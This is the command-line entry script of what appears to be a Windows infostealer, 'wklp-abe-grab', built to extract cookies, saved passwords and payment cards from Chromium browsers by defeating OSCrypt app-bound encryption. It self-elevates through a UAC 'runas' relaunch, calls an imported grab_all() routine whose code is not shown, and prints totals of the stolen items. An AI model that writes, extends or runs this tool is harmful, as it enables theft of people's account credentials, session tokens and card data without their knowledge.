import argparse
import ctypes
import sys

from wklp_abe_grab.browsers import BROWSERS
from wklp_abe_grab.orchestrator import grab_all


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="wklp-abe-grab",
        description="wklp - Chromium credential extraction via OSCrypt hwbp.")
    parser.add_argument("--browser", action="append",
                        choices=sorted(BROWSERS.keys()),
                        help="browser to process; repeatable")
    parser.add_argument("--out", default="grabbed",
                        help="output directory (default: grabbed/)")
    parser.add_argument("--no-elevate", action="store_true",
                        help="skip the UAC self-elevation step")
    args = parser.parse_args(argv)

    if not args.no_elevate and not ctypes.windll.shell32.IsUserAnAdmin():
        params = " ".join('"%s"' % a for a in sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            '"%s" %s' % (__file__, params), None, 1)
        return 0

    result = grab_all(args.out)

    tc = sum(len(p["cookies"]) for b in result.values()
             for p in b["profiles"].values())
    tp = sum(len(p["passwords"]) for b in result.values()
             for p in b["profiles"].values())
    tk = sum(len(p["cards"]) for b in result.values()
             for p in b["profiles"].values())

    print("\ndone cookies=%d passwords=%d cards=%d" % (tc, tp, tk))
    print("-> %s/" % args.out)
    print("wklp")
    return 0